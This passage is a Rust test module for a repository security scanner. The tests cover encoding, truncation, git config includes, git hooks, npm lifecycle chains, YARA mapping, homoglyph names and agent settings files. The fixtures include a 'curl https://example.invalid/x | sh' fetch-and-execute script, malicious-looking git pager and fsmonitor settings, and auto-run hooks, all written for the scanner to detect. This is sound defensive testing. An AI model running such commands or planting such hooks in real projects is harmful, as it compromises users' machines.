                    && let Some(i) = t.find("needle")
                {
                    out.push(finding(
                        "stub.needle",
                        f.path,
                        Severity::Low,
                        files::line_of(t, i),
                        1,
                    ));
                }
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert_eq!(by_rule(&s, "stub.needle", "utf16.txt").line, 3);
        assert_eq!(by_rule(&s, "stub.needle", "crlf.txt").line, 3);
        assert_eq!(
            by_rule(&s, "stub.needle", "bad.txt").line,
            1,
            "invalid UTF-8 is read lossily, not skipped"
        );
        assert!(
            !s.findings.iter().any(|f| f.rule == "files.not-utf8"),
            "a doc is not code, config or an agent file"
        );
        assert!(s.errors.is_empty() && !s.partial);
        assert_eq!(s.files, 3);
    }

    #[test]
    fn rules_see_the_kind_the_cap_and_the_bytes() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "big.txt", "é".repeat(2000).as_bytes());
        write(tmp.path(), "blob.bin", &[0u8; 50_000]);
        write(tmp.path(), "small.js", b"ok");
        let mut cfg = vec![b'#'; 100_000];
        cfg[10] = b'\n';
        write(tmp.path(), ".git/config", &cfg);
        let h = Hooks {
            check: |f, out| {
                let mut x = finding("stub.ctx", f.path, Severity::Info, 1, 1);
                x.seen = format!(
                    "{:?} bytes={} truncated={} text={}",
                    f.kind,
                    f.bytes.len(),
                    f.truncated,
                    f.text.map_or(0, str::len)
                );
                out.push(x);
            },
            ..quiet()
        };
        let o = WalkOpts {
            text_cap: 1001,
            ..WalkOpts::default()
        };
        let s = scan_opts(tmp.path(), o, h);
        // 1001 bytes cut a two-byte letter in half: the text drops the half, the bytes keep it.
        assert_eq!(
            by_rule(&s, "stub.ctx", "big.txt").seen,
            "Doc bytes=1001 truncated=true text=1000"
        );
        assert_eq!(
            by_rule(&s, "stub.ctx", "blob.bin").seen,
            "Binary bytes=1001 truncated=true text=0"
        );
        assert_eq!(
            by_rule(&s, "stub.ctx", "small.js").seen,
            "Code(Js) bytes=2 truncated=false text=2"
        );
        // `.git/config` is read to the text cap like any other file.
        assert!(
            by_rule(&s, "stub.ctx", ".git/config")
                .seen
                .starts_with("Config bytes=1001 truncated=true"),
            "{}",
            by_rule(&s, "stub.ctx", ".git/config").seen
        );
    }

    #[test]
    fn a_stray_byte_does_not_hide_an_auto_run_file_from_the_rules() {
        // C1: `"description": "\xff"` next to a postinstall.
        let tmp = tempfile::tempdir().unwrap();
        write(
            tmp.path(),
            "package.json",
            b"{\"description\":\"\xff\",\"scripts\":{\"postinstall\":\"x\"}}",
        );
        write(tmp.path(), ".vscode/tasks.json", b"// \xff\n{\"tasks\":[]}");
        write(tmp.path(), ".claude/settings.json", b"{\"hooks\":{}}\0");
        write(tmp.path(), ".mcp.json", b"{\"a\":\"\xfe\"}");
        write(tmp.path(), "a.js", b"//\0\nrequire('child_process')\n");
        write(tmp.path(), "clean.js", b"let a = 1;\n");
        write(tmp.path(), "notes.txt", b"a \xff b\n");
        write(tmp.path(), "data.bin", b"\xff\xff\xff");
        let h = Hooks {
            check: |f, out| {
                if let Some(t) = f.text
                    && (t.contains("postinstall") || t.contains("require") || t.contains("hooks"))
                {
                    out.push(finding("stub.saw", f.path, Severity::Low, 1, 1));
                }
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        for p in ["package.json", "a.js", ".claude/settings.json"] {
            by_rule(&s, "stub.saw", p);
        }
        for p in [
            "package.json",
            ".vscode/tasks.json",
            ".claude/settings.json",
            ".mcp.json",
        ] {
            let f = by_rule(&s, "files.not-utf8", p);
            assert_eq!(f.severity, Severity::High, "{p} is a known auto-run name");
            assert_eq!(f.group, Group::Hidden);
            assert!(!f.why.is_empty() && !f.action.is_empty() && !f.seen.is_empty());
        }
        assert_eq!(
            by_rule(&s, "files.not-utf8", "a.js").severity,
            Severity::Medium
        );
        assert_eq!(
            by_rule(&s, "files.not-utf8", "a.js").seen,
            "NUL byte at byte 2"
        );
        let not_flagged = ["clean.js", "notes.txt", "data.bin"];
        assert!(
            !s.findings
                .iter()
                .any(|f| f.rule == "files.not-utf8" && not_flagged.contains(&f.path.as_str())),
            "{:#?}",
            s.findings
        );
    }

    #[test]
    fn a_clean_utf16_auto_run_file_has_no_encoding_finding() {
        let tmp = tempfile::tempdir().unwrap();
        let mut le = vec![0xff, 0xfe];
        le.extend(
            "{\"scripts\":{}}"
                .encode_utf16()
                .flat_map(|u| u.to_le_bytes()),
        );
        write(tmp.path(), "package.json", &le);
        let s = scan_with(tmp.path(), quiet());
        assert!(s.findings.is_empty(), "{:#?}", s.findings);
    }

    #[test]
    fn a_truncated_auto_run_or_agent_file_is_high_and_marks_the_scan_partial() {
        // C2: padding before `"scripts"` must not hide it.
        let tmp = tempfile::tempdir().unwrap();
        let pad = |n: usize| {
            let mut v = vec![b' '; n];
            v.extend(b"{\"scripts\":{}}");
            v
        };
        write(tmp.path(), "package.json", &pad(3000));
        write(tmp.path(), "CLAUDE.md", &pad(3000));
        write(tmp.path(), ".git/config", &pad(3000));
        write(tmp.path(), "big.js", &pad(3000));
        write(tmp.path(), "big.txt", &pad(3000));
        write(tmp.path(), "big.bin", &[0u8; 3000]);
        write(tmp.path(), "small.json", b"{}");
        let h = Hooks {
            is_instruction: |p| p == "CLAUDE.md",
            ..quiet()
        };
        let o = WalkOpts {
            text_cap: 2000,
            ..WalkOpts::default()
        };
        let s = scan_opts(tmp.path(), o, h);
        for p in ["package.json", "CLAUDE.md", ".git/config"] {
            let f = by_rule(&s, "files.truncated", p);
            assert_eq!(f.severity, Severity::High, "{p}");
            assert_eq!(f.group, Group::Hidden);
        }
        let flagged: Vec<&str> = s
            .findings
            .iter()
            .filter(|f| f.rule == "files.truncated")
            .map(|f| f.path.as_str())
            .collect();
        assert_eq!(
            flagged.len(),
            3,
            "{flagged:?}: code, docs and binaries are only partial"
        );
        assert!(s.partial);
        assert!(
            s.errors.iter().any(|e| e.contains("big.js")),
            "a cut code file is named: {:?}",
            s.errors
        );
        assert!(
            !s.errors
                .iter()
                .any(|e| e.contains("big.txt") || e.contains("big.bin"))
        );
    }

    #[test]
    fn a_git_config_longer_than_the_old_64_kib_cap_is_read_in_full() {
        let tmp = tempfile::tempdir().unwrap();
        let mut cfg = "# pad\n".repeat(20_000).into_bytes();
        cfg.extend(b"[core]\n\tfsmonitor = x\n");
        write(tmp.path(), ".git/config", &cfg);
        let h = Hooks {
            check: |f, out| {
                if f.text.is_some_and(|t| t.contains("fsmonitor")) {
                    out.push(finding("stub.fsmonitor", f.path, Severity::High, 1, 1));
                }
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        by_rule(&s, "stub.fsmonitor", ".git/config");
        assert!(!s.findings.iter().any(|f| f.rule == "files.truncated"));
        assert!(!s.partial);
    }

    fn pager_hooks() -> Hooks {
        Hooks {
            check: |f, out| {
                if f.text.is_some_and(|t| t.contains("pager = evil")) {
                    out.push(finding("stub.pager", f.path, Severity::High, 1, 1));
                }
            },
            ..quiet()
        }
    }

    #[test]
    fn a_git_config_include_inside_the_repo_is_read_as_part_of_the_config() {
        // I2: `[include] path = ...` pulls a file in; git reads it as config.
        let tmp = tempfile::tempdir().unwrap();
        write(
            tmp.path(),
            ".git/config",
            b"[include]\n\tpath = extra.cfg\n[includeIf \"gitdir:/x/\"]\n\tpath = ../ci/more.cfg\n",
        );
        write(tmp.path(), ".git/extra.cfg", b"[core]\n\tpager = evil\n");
        write(tmp.path(), "ci/more.cfg", b"[core]\n\tsshCommand = x\n");
        let s = scan_with(tmp.path(), pager_hooks());
        let f = by_rule(&s, "stub.pager", ".git/config");
        assert_eq!(f.severity, Severity::High);
    }

    #[test]
    fn includes_that_leave_the_repo_or_loop_are_not_followed() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "outside/x.cfg", b"[core]\n\tpager = evil\n");
        write(
            tmp.path(),
            "repo/.git/config",
            b"[include]\n\tpath = ../../outside/x.cfg\n\tpath = ~/x.cfg\n\tpath = loop.cfg\n",
        );
        write(
            tmp.path(),
            "repo/.git/loop.cfg",
            b"[include]\n\tpath = loop.cfg\n\tpath = config\n",
        );
        let s = scan_with(&tmp.path().join("repo"), pager_hooks());
        assert!(
            !s.findings.iter().any(|f| f.rule == "stub.pager"),
            "{:#?}",
            s.findings
        );
    }

    #[test]
    fn a_nested_include_is_followed_one_file_at_a_time() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), ".git/config", b"[include]\n\tpath = a.cfg\n");
        write(tmp.path(), ".git/a.cfg", b"[include]\n\tpath = b.cfg\n");
        write(tmp.path(), ".git/b.cfg", b"[core]\n\tpager = evil\n");
        let s = scan_with(tmp.path(), pager_hooks());
        by_rule(&s, "stub.pager", ".git/config");
    }

    #[test]
    fn the_include_targets_of_a_config_are_read_by_header_and_key() {
        let cfg = "[core]\n\tpath = no\n[include]\n\tpath = \"a b.cfg\"\n\tPATH = c.cfg ; note\n\tother = no\n[includeIf \"gitdir:x\"]\n\tpath = d.cfg\n[remote \"o\"]\n\tpath = no\n";
        assert_eq!(include_targets(cfg), ["a b.cfg", "c.cfg", "d.cfg"]);
    }

    #[test]
    fn a_gitattributes_filter_that_another_file_configures_is_raised_by_the_real_scan() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), ".gitattributes", b"*.dat filter=scrub\n");
        write(
            tmp.path(),
            "README.md",
            b"Run: git config filter.scrub.smudge ./scrub.sh\n",
        );
        let tree = DiskTree::open(tmp.path(), &WalkOpts::default(), None).unwrap();
        let s = crate::scan(&tree);
        assert_eq!(
            by_rule(&s, "autorun.gitattributes-filter", ".gitattributes").severity,
            Severity::High
        );
    }

    #[test]
    fn the_raise_filters_hook_gets_only_files_that_mention_a_filter() {
        use std::sync::Mutex;
        static SEEN: Mutex<Vec<String>> = Mutex::new(Vec::new());
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "a.md", b"git config filter.x.clean y\n");
        write(tmp.path(), "b.md", b"nothing here\n");
        write(tmp.path(), "c.md", b"filter. but no g-i-t\n");
        let h = Hooks {
            raise_filters: |f, _| SEEN.lock().unwrap().push(f.path.to_string()),
            ..quiet()
        };
        scan_with(tmp.path(), h);
        assert_eq!(*SEEN.lock().unwrap(), ["a.md"]);
    }

    #[test]
    fn a_big_binary_is_read_only_to_its_head() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "blob.bin", &[0u8; 50_000]);
        write(tmp.path(), "big.js", &[b'a'; 50_000]);
        let h = Hooks {
            check: |f, out| {
                let mut x = finding("stub.len", f.path, Severity::Info, 1, 1);
                x.seen = format!("{:?} {} {}", f.kind, f.bytes.len(), f.truncated);
                out.push(x);
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert_eq!(by_rule(&s, "stub.len", "blob.bin").seen, "Binary 8192 true");
        assert_eq!(
            by_rule(&s, "stub.len", "big.js").seen,
            "Code(Js) 50000 false"
        );
    }

    #[test]
    fn git_dir_hooks_and_config_reach_the_rules() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), ".git/config", b"[core]\n\tfsmonitor = x\n");
        write(tmp.path(), ".git/hooks/pre-commit", b"#!/bin/sh\n");
        write(tmp.path(), ".git/hooks/pre-commit.sample", b"#!/bin/sh\n");
        write(tmp.path(), ".git/HEAD", b"ref\n");
        let h = Hooks {
            check: echo_rule,
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        let mut paths: Vec<&str> = s.findings.iter().map(|f| f.path.as_str()).collect();
        paths.sort();
        assert_eq!(paths, [".git/config", ".git/hooks/pre-commit"]);
    }

    #[test]
    fn every_git_hook_entry_is_high_even_a_symlink_that_stays_inside_the_root() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "a.sh", b"#!/bin/sh\n");
        write(tmp.path(), ".git/hooks/pre-commit", b"#!/bin/sh\n");
        write(tmp.path(), ".git/hooks/pre-commit.sample", b"#!/bin/sh\n");
        symlink("../../a.sh", tmp.path().join(".git/hooks/pre-push")).unwrap();
        let h = Hooks {
            entry_findings: autorun::entry_findings,
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        for hook in ["pre-commit", "pre-push"] {
            let f = by_rule(&s, "autorun.git-hooks", &format!(".git/hooks/{hook}"));
            assert_eq!(f.severity, Severity::High, "{hook}");
        }
        let hooks = s.findings.iter().filter(|f| f.rule == "autorun.git-hooks");
        assert_eq!(hooks.count(), 2);
    }

    fn chain_hooks() -> Hooks {
        Hooks {
            check: |f, out| {
                if f.path == "evil.js" {
                    out.push(finding("stub.flagged", f.path, Severity::High, 1, 1));
                }
            },
            surfaces: |f, _| {
                let command = match f.path {
                    "package.json" => "node evil.js",
                    "pkg/package.json" => "node ok.js",
                    "up/package.json" => "node ../evil.js",
                    _ => return Vec::new(),
                };
                vec![Surface {
                    path: f.path.to_string(),
                    line: 3,
                    trigger: Trigger::Install,
                    command: command.to_string(),
                    rule: "autorun.npm-lifecycle",
                    floor: Severity::Info,
                    dir: f
                        .path
                        .trim_end_matches("package.json")
                        .trim_end_matches('/')
                        .to_string(),
                }]
            },
            files_run: |c| c.split_whitespace().skip(1).map(str::to_string).collect(),
            severity: |_, _, reached| {
                if reached >= Some(Severity::High) {
                    Severity::Critical
                } else {
                    Severity::Medium
                }
            },
            ..quiet()
        }
    }

    #[test]
    fn chain_raises_a_lifecycle_that_runs_a_flagged_file() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "package.json", b"{}");
        write(tmp.path(), "evil.js", b"x");
        write(tmp.path(), "pkg/package.json", b"{}");
        write(tmp.path(), "pkg/ok.js", b"x");
        let s = scan_with(tmp.path(), chain_hooks());
        let hot = by_rule(&s, "autorun.npm-lifecycle", "package.json");
        assert_eq!(hot.severity, Severity::Critical);
        assert_eq!(hot.seen, "node evil.js");
        assert_eq!(hot.line, 3);
        assert_eq!(hot.group, Group::Autorun);
        assert!(!hot.why.is_empty() && !hot.action.is_empty());
        let calm = by_rule(&s, "autorun.npm-lifecycle", "pkg/package.json");
        assert_eq!(calm.severity, Severity::Medium);
    }

    #[test]
    fn chain_resolves_files_relative_to_the_surface_dir() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "evil.js", b"x");
        write(tmp.path(), "up/package.json", b"{}");
        let s = scan_with(tmp.path(), chain_hooks());
        let f = by_rule(&s, "autorun.npm-lifecycle", "up/package.json");
        assert_eq!(
            f.severity,
            Severity::Critical,
            "`../evil.js` from up/ is evil.js"
        );
    }

    #[test]
    fn a_surface_floor_wins_over_a_lower_matrix_result() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "package.json", b"{}");
        let h = Hooks {
            surfaces: |f, _| {
                vec![Surface {
                    path: f.path.to_string(),
                    line: 1,
                    trigger: Trigger::Open,
                    command: "x".to_string(),
                    rule: "agent.credential-helper",
                    floor: Severity::High,
                    dir: String::new(),
                }]
            },
            severity: |_, _, _| Severity::Low,
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        let f = by_rule(&s, "agent.credential-helper", "package.json");
        assert_eq!(f.severity, Severity::High);
        assert_eq!(f.group, Group::Agent, "the rule's prefix names the group");
    }

    #[test]
    fn chain_ignores_a_command_that_leaves_the_root() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "evil.js", b"x");
        write(tmp.path(), "pkg/package.json", b"{}");
        let h = Hooks {
            files_run: |_| vec!["../../evil.js".to_string(), "/evil.js".to_string()],
            ..chain_hooks()
        };
        let s = scan_with(tmp.path(), h);
        let f = by_rule(&s, "autorun.npm-lifecycle", "pkg/package.json");
        assert_eq!(f.severity, Severity::Medium);
    }

    #[test]
    fn npm_run_resolves_one_level() {
        let tmp = tempfile::tempdir().unwrap();
        for d in ["a", "b", "c"] {
            write(tmp.path(), &format!("{d}/package.json"), b"{}");
        }
        let h = Hooks {
            surfaces: |f, _| {
                let command = match f.path {
                    "a/package.json" => "npm run build",
                    "b/package.json" => "npm run nope",
                    "c/package.json" => "npm run wrap",
                    _ => return Vec::new(),
                };
                vec![Surface {
                    path: f.path.to_string(),
                    line: 1,
                    trigger: Trigger::Install,
                    command: command.to_string(),
                    rule: "autorun.npm-lifecycle",
                    floor: Severity::Info,
                    dir: f.path.trim_end_matches("/package.json").to_string(),
                }]
            },
            npm_scripts: |f| {
                if f.path.ends_with("package.json") {
                    vec![
                        (
                            "build".to_string(),
                            "curl https://example.invalid/x | sh".to_string(),
                        ),
                        ("wrap".to_string(), "npm run build".to_string()),
                    ]
                } else {
                    Vec::new()
                }
            },
            npm_run_target: |c| c.strip_prefix("npm run ").map(str::to_string),
            classify: |c| {
                if c.contains("curl") {
                    Shape::FetchExec
                } else {
                    Shape::Plain
                }
            },
            severity: |_, shape, _| {
                if shape == Shape::FetchExec {
                    Severity::Critical
                } else {
                    Severity::Medium
                }
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert_eq!(
            by_rule(&s, "autorun.npm-lifecycle", "a/package.json").severity,
            Severity::Critical
        );
        assert_eq!(
            by_rule(&s, "autorun.npm-lifecycle", "b/package.json").severity,
            Severity::Medium
        );
        assert_eq!(
            by_rule(&s, "autorun.npm-lifecycle", "c/package.json").severity,
            Severity::Medium,
            "one level only"
        );
    }

    fn yara_hooks() -> Hooks {
        Hooks {
            yara: |f| {
                let sev = |s| YaraHit {
                    rule: "threat-stub".to_string(),
                    severity: s,
                    line: 4,
                    seen: "bad()".to_string(),
                };
                match f.path {
                    "a.js" | "evil.js" | "setup.py" | "build.rs" | "hooks/run.py" | "notes.txt" => {
                        vec![sev("high")]
                    }
                    "m.js" => vec![sev("medium")],
                    "l.js" => vec![sev("low")],
                    _ => Vec::new(),
                }
            },
            surfaces: |f, _| {
                let (trigger, command) = match f.path {
                    "package.json" => (Trigger::Install, "node evil.js"),
                    "hooks/run.py" => (Trigger::Build, "make"),
                    _ => return Vec::new(),
                };
                vec![Surface {
                    path: f.path.to_string(),
                    line: 1,
                    trigger,
                    command: command.to_string(),
                    rule: "autorun.npm-lifecycle",
                    floor: Severity::Info,
                    dir: String::new(),
                }]
            },
            files_run: |c| c.split_whitespace().skip(1).map(str::to_string).collect(),
            severity: |_, _, reached| {
                if reached >= Some(Severity::High) {
                    Severity::Critical
                } else {
                    Severity::Medium
                }
            },
            ..quiet()
        }
    }

    #[test]
    fn yara_hits_map_severity_and_rise_one_level_in_reached_files() {
        let tmp = tempfile::tempdir().unwrap();
        for p in [
            "package.json",
            "a.js",
            "evil.js",
            "m.js",
            "l.js",
            "setup.py",
            "build.rs",
            "hooks/run.py",
            "notes.txt",
        ] {
            write(tmp.path(), p, b"x");
        }
        let s = scan_with(tmp.path(), yara_hooks());
        let sev = |p: &str| by_rule(&s, "yara.threat-stub", p).severity;
        // GuardDog high -> MEDIUM, medium -> LOW, low -> INFO; a reached file goes one level up.
        assert_eq!(sev("a.js"), Severity::Medium);
        assert_eq!(sev("m.js"), Severity::Low);
        assert_eq!(sev("l.js"), Severity::Info);
        assert_eq!(sev("evil.js"), Severity::High, "run by an install script");
        assert_eq!(
            sev("setup.py"),
            Severity::High,
            "setup.py is always reached"
        );
        assert_eq!(
            sev("build.rs"),
            Severity::High,
            "build.rs is always reached"
        );
        assert_eq!(
            sev("hooks/run.py"),
            Severity::High,
            "a Build surface's own file is reached"
        );
        let f = by_rule(&s, "yara.threat-stub", "a.js");
        assert_eq!(
            (f.group, f.line, f.seen.as_str(), f.count),
            (Group::Yara, 4, "bad()", 1)
        );
        assert!(!f.why.is_empty() && !f.action.is_empty());
        assert!(
            !s.findings.iter().any(|f| f.path == "notes.txt"),
            "YARA runs on code only"
        );
        // The raised hit is what the install script's own severity reads.
        assert_eq!(
            by_rule(&s, "autorun.npm-lifecycle", "package.json").severity,
            Severity::Critical
        );
    }

    #[test]
    fn homoglyph_twins_are_raised_once_with_every_path_after_the_rules() {
        use std::sync::atomic::{AtomicUsize, Ordering};
        static CALLS: AtomicUsize = AtomicUsize::new(0);
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "evil.js", b"x");
        write(tmp.path(), "other.js", b"x");
        symlink("evil.js", tmp.path().join("twin.js")).unwrap();
        let h = Hooks {
            check: |f, out| out.push(finding("stub.name", f.path, Severity::Medium, 1, 1)),
            raise_twins: |paths, findings| {
                CALLS.fetch_add(1, Ordering::Relaxed);
                // Every entry is a path, links included, and the per-file findings exist already.
                assert!(paths.contains(&"twin.js") && paths.contains(&"evil.js"));
                for f in findings.iter_mut().filter(|f| f.path == "evil.js") {
                    f.severity = Severity::High;
                }
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert_eq!(CALLS.load(Ordering::Relaxed), 1);
        assert_eq!(by_rule(&s, "stub.name", "evil.js").severity, Severity::High);
        assert_eq!(
            by_rule(&s, "stub.name", "other.js").severity,
            Severity::Medium
        );
    }

    #[test]
    fn the_real_scan_gives_a_look_alike_name_and_its_twin_a_high() {
        let tmp = tempfile::tempdir().unwrap();
        // The `е` in the second name is Cyrillic U+0435.
        write(tmp.path(), "gradle/gradle-wrapper.jar", b"x");
        write(tmp.path(), "gradle/gradl\u{0435}-wrapper.jar", b"x");
        write(tmp.path(), "lone/gradl\u{0435}-wrapper.jar", b"x");
        let tree = DiskTree::open(tmp.path(), &WalkOpts::default(), None).unwrap();
        let s = crate::scan(&tree);
        let rule = "hidden.homoglyph-name";
        assert_eq!(
            by_rule(&s, rule, "gradle/gradl\u{0435}-wrapper.jar").severity,
            Severity::High
        );
        assert_eq!(
            by_rule(&s, rule, "lone/gradl\u{0435}-wrapper.jar").severity,
            Severity::Medium,
            "no twin in its folder"
        );
    }

    #[test]
    fn one_finding_per_rule_per_file() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "a.js", b"x");
        write(tmp.path(), "b.js", b"x");
        let h = Hooks {
            check: |f, out| {
                out.push(finding("x.rule", f.path, Severity::Low, 5, 1));
                if f.path == "a.js" {
                    out.push(finding("x.rule", f.path, Severity::Medium, 2, 2));
                    out.push(finding("x.rule", f.path, Severity::Low, 9, 1));
                    out.push(finding("y.rule", f.path, Severity::Low, 1, 1));
                }
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert_eq!(s.findings.len(), 3, "{:#?}", s.findings);
        let a = by_rule(&s, "x.rule", "a.js");
        assert_eq!((a.count, a.severity, a.line), (4, Severity::Medium, 2));
        assert_eq!(by_rule(&s, "x.rule", "b.js").count, 1);
        assert_eq!(by_rule(&s, "y.rule", "a.js").count, 1);
    }

    #[test]
    fn many_hits_of_one_rule_merge_into_the_first_line_with_the_summed_count() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), ".mcp.json", b"{}");
        let h = Hooks {
            check: |f, out| {
                // One finding per hit, in file order, as `agent.rs` emits them.
                for line in [3, 7, 9] {
                    out.push(finding(
                        "agent.mcp-stdio",
                        f.path,
                        Severity::Medium,
                        line,
                        1,
                    ));
                }
                out.push(finding("agent.mcp-stdio", f.path, Severity::Low, 12, 2));
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert_eq!(s.findings.len(), 1);
        let f = &s.findings[0];
        assert_eq!((f.line, f.count, f.severity), (3, 5, Severity::Medium));
    }

    #[test]
    fn a_settings_command_reaches_files_from_the_folder_above_dot_claude() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), ".claude/settings.json", b"{}");
        write(tmp.path(), "scripts/x.js", b"x");
        write(tmp.path(), ".claude/scripts/x.js", b"x");
        let h = Hooks {
            check: |f, out| {
                if f.path == "scripts/x.js" {
                    out.push(finding("stub.flagged", f.path, Severity::High, 1, 1));
                }
            },
            surfaces: |f, _| {
                if f.path != ".claude/settings.json" {
                    return Vec::new();
                }
                // `dir` is the folder above `.claude`: the root, as an empty string.
                vec![Surface {
                    path: f.path.to_string(),
                    line: 4,
                    trigger: Trigger::Open,
                    command: "node scripts/x.js".to_string(),
                    rule: "agent.claude-hook",
                    floor: Severity::Info,
                    dir: String::new(),
                }]
            },
            files_run: |c| c.split_whitespace().skip(1).map(str::to_string).collect(),
            severity: |_, _, reached| {
                if reached >= Some(Severity::High) {
                    Severity::Critical
                } else {
                    Severity::Medium
                }
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        let f = by_rule(&s, "agent.claude-hook", ".claude/settings.json");
        assert_eq!(
            f.severity,
            Severity::Critical,
            "scripts/x.js is at the root"
        );
        assert_eq!(f.group, Group::Agent);
    }

    #[test]
    fn findings_come_back_in_a_stable_order() {
        let tmp = tempfile::tempdir().unwrap();
        for p in ["a.js", "b.js", "c.js", "d.js"] {
            write(tmp.path(), p, b"x");
        }
        let h = Hooks {
            check: |f, out| {
                let sev = match f.path {
                    "c.js" => Severity::High,
                    "a.js" => Severity::Low,
                    _ => Severity::Medium,
                };
                out.push(finding("x.rule", f.path, sev, 1, 1));
            },
            ..quiet()
        };
        let first = scan_with(tmp.path(), h);
        let second = scan_with(tmp.path(), h);
        assert_eq!(first.findings, second.findings);
        let order: Vec<&str> = first.findings.iter().map(|f| f.path.as_str()).collect();
        assert_eq!(order, ["c.js", "b.js", "d.js", "a.js"]);
    }

    #[test]
    fn instructions_are_the_agent_files() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "CLAUDE.md", b"x");
        write(tmp.path(), "README.md", b"x");
        write(tmp.path(), ".claude/commands/go.md", b"x");
        let h = Hooks {
            is_instruction: |p| p == "CLAUDE.md" || p.starts_with(".claude/commands/"),
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert_eq!(s.instructions, [".claude/commands/go.md", "CLAUDE.md"]);
    }

    #[test]
    fn about_is_the_readme_paragraph_and_the_manifest_description() {
        let tmp = tempfile::tempdir().unwrap();
        write(
            tmp.path(),
            "README.md",
            b"# Title\n\n[![ci](https://example.invalid/b.svg)](https://example.invalid)\n\nA tool that does X.\nSecond line.\n\nLater paragraph.\n",
        );
        write(
            tmp.path(),
            "package.json",
            br#"{"name":"x","description":"Does X, quickly"}"#,
        );
        write(
            tmp.path(),
            "pyproject.toml",
            b"[project]\nname = \"x\"\ndescription = \"A python thing\"\n",
        );
        write(
            tmp.path(),
            "Cargo.toml",
            b"[package]\ndescription = 'A crate'\n",
        );
        let s = scan_with(tmp.path(), quiet());
        assert_eq!(
            s.about,
            "README.md: A tool that does X. Second line.\npackage.json: Does X, quickly\npyproject.toml: A python thing\nCargo.toml: A crate"
        );
    }

    #[test]
    fn about_is_cut_at_its_byte_limits_on_a_character_boundary() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "README.md", "é".repeat(1000).as_bytes());
        let long = "ü".repeat(300);
        write(
            tmp.path(),
            "package.json",
            format!(r#"{{"description":"{long}"}}"#).as_bytes(),
        );
        let s = scan_with(tmp.path(), quiet());
        let mut lines = s.about.lines();
        let readme = lines.next().unwrap().strip_prefix("README.md: ").unwrap();
        assert_eq!(readme.len(), 600);
        let desc = lines
            .next()
            .unwrap()
            .strip_prefix("package.json: ")
            .unwrap();
        assert_eq!(desc.len(), 200);
    }

    #[test]
    fn about_is_empty_without_a_readme_or_manifest() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "a.txt", b"x");
        assert_eq!(scan_with(tmp.path(), quiet()).about, "");
    }

    #[test]
    fn a_panicking_rule_is_an_error_not_a_silent_drop() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "a.js", b"x");
        write(tmp.path(), "boom.js", b"x");
        write(tmp.path(), "z.js", b"x");
        let h = Hooks {
            check: |f, out| {
                assert!(f.path != "boom.js", "rule bug");
                out.push(finding("x.rule", f.path, Severity::Low, 1, 1));
            },
            ..quiet()
        };
        let s = scan_with(tmp.path(), h);
        assert!(s.partial);
        assert!(
            s.errors.iter().any(|e| e.contains("boom.js")),
            "{:?}",
            s.errors
        );
        assert_eq!(by_rule(&s, "x.rule", "a.js").count, 1);
        assert_eq!(by_rule(&s, "x.rule", "z.js").count, 1);
    }

    #[test]
    fn the_public_scan_runs_the_real_rules_over_every_file() {
        let tmp = tempfile::tempdir().unwrap();
        write(tmp.path(), "a.js", b"let a = 1;\n");
        write(tmp.path(), "sub/b.py", b"b = 2\n");
        write(tmp.path(), "blob.bin", &[0u8; 100]);
        let tree = DiskTree::open(tmp.path(), &WalkOpts::default(), None).unwrap();
        let s = crate::scan(&tree);
        assert_eq!(s.files, 3);
        assert!(!s.partial && s.errors.is_empty());
    }
}
